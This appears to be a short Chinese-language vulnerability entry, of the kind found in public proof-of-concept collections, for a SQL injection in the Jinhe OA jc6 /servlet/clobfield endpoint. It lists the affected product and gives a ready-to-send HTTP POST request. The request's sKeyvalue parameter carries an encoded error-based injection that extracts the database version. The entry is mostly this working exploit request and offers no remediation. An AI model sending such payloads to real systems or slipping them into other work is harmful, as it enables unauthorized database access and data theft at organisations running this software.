**漏洞描述：**

金和OA jc6 ljc6/servlet/clobfield接口处存在SQL注入漏洞，攻击者可获取数据中中敏感信息。

**影响版本：**

金和协和管理平台

**Payload：**

```yaml
POST /jc6/servlet/clobfield HTTP/1.1
host:127.0.0.1

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11%27%2F**%2Fand%2F**%2FCONVERT%28int%2C%40%40version%29%3D1%2F**%2Fand%2F**%2F%27%27%3D%27
```

---
